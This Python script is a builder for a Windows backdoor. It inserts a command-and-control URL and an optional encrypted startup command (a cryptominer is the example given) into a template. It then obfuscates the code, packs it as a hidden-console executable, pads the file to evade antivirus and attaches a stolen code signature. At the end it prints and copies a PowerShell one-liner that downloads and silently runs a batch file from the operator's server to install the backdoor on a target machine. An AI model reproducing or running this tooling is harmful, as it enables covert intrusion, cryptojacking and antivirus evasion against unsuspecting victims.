from evasion import increasesize, encrypt
import pyperclip
import os

with open("executor.py", "r") as f:
    build = f.read()
    f.close()
url_old = input("Enter your server URL with HTTPS/HTTP: ")
if url_old.endswith("/"):
    url_old = url_old[:-1] + ""
print("Your SERVER URL in base64 is: ", encrypt.to_base64(url_old.encode()))
input("Make sure you save this and upload it in a raw text file for the executor to read. Press enter to continue.")
url = input("Link to the text file that contains your Server URL. \nMake sure your ADMIN server URL is in base64 inside the text file. The best place to host your text file is GitHub. \nURL: ")
if url.endswith("/"):
    url = url[:-1] + ""
if not url.startswith(("http://", "https://")):
    print("Is your server a HTTP or a HTTPS server? (HTTP/HTTPS): ")
    choice = input().strip().lower()
    if choice == "https":
        print(f"Replacing {url} with https://{url}")
        url = "https://" + url
    elif choice == "http":
        print(f"Replacing {url} with http://{url}")
        url = "http://" + url
command = input("Would you like to execute any commands upon file startup? e.g cryptominer. Y/N: ")
if command.lower() == "y":
    build = build.replace("upon_start = False", "upon_start = True")
    key = encrypt.generate_key()
    build = build.replace("'ENCRYPT_KEY'", str(key))
    cmd = input("Enter the command you would like to execute: \n")
    cmd = encrypt.encrypt(key, cmd)
    build = build.replace("'COMMAND_UPON_START'", str(cmd))
    with open("keys.txt", "a") as f:
        f.write(f"Key: {key}\n")
        f.close()
build = build.replace("DO_NOT_CHANGE_ME", url)
with open("source.py", "w") as f:
    f.write(build)
    f.close()
obfusc = input("Would you like to obfuscate the code? Y/N: ")

if obfusc.lower() == "y":
    os.system('evasion\obfuscation.py --input source.py --output source.py --include_imports')
    print("Obfuscation complete.")
name = input("What shall be the name of the executable? ")
os.system('del dist\*.exe')
use_icon = input("Use default icon? Y/N: ")
if use_icon.lower() == "y":
    os.system('cls')
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon=resources\icon.ico --name="{name}" """)
    print("Appending data for AV evasion.")
    increasesize.append_data(f"dist\{name}.exe")
    os.system('cls')
    print("Your executable is ready. It can be found in the the dist directory.")
    os.system(f'del *.spec')
else:
    os.system('cls')
    icon = input("Path of the icon.ico to use (relative to this directory): ")
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon={icon} --name="{name}" """)
    print("Appending data for AV evasion.")
    increasesize.append_data(f"dist\{name}.exe")
    os.system(f'del *.spec')
    os.system('cls')
    print("Your executable is ready. It can be found in the the dist directory.")

sign = input("Would you like to sign the executable? Y/N: ")
if sign.lower() == "y":
    os.system(f"""evasion\sigthief.py --add --target="dist\{name}.exe" --output=--target="dist\{name}.exe" --sig=evasion\cert""")


def change_scripts(url):
    scripts = os.listdir("scripts")
    for script in scripts:
        with open(f"scripts/{script}", "r") as f:
            data = f.read()
            f.close()
        data = data.replace("https://server.api", url)
        with open(f"scripts/{script}", "w") as f:
            f.write(data)
            f.close()
    with open("resources\installer.bat", "r") as f:
        data = f.read()
        f.close()
    data = data.replace("https://server.api", url)
    with open("resources\installer.bat", "w") as f:
        f.write(data)
        f.close()

change = input("Would you like to also ADD this URL in the scripts for proper functioning? Y/N: ")
if change.lower() == "y":
    change_scripts(url_old)
    print("URL added to scripts.")


print("All done. Exiting.")
command = f"""powershell -Command "iwr '{url_old}/bat' -OutFile '%TEMP%\\update.bat'; start-process '%TEMP%\\update.bat' -WindowStyle Hidden" """
print(f"""Run the following command on any machine to install the backdoor!\n\n\n{command} \n\n\nThis will install and run the backdoor on the target machine.""")
print("This command has been copied to your clipboard.")
pyperclip.copy(command)


